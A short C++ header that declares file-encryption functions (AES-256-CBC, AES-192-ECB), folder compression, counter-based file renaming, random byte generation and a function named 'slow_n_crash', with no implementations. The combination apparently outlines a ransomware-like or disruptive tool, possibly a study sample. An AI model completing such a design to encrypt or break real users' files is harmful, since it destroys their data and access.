#ifndef ENCRYPTOR_H
#define ENCRYPTOR_H

#include <string>
#include <vector>


void aes256_cbc_encrypt(const std::string &file, const std::vector<unsigned char> &key, const std::vector<unsigned char> &iv);
void aes192_ecb_encrypt(const std::string &file, const std::vector<unsigned char> &key);


void compress_folder(const std::string &folder_path);
void rename_file(const std::string &file, int counter);


std::vector<unsigned char> gen_bytes(size_t num_bytes);


void slow_n_crash();

#endif // ENCRYPTOR_H
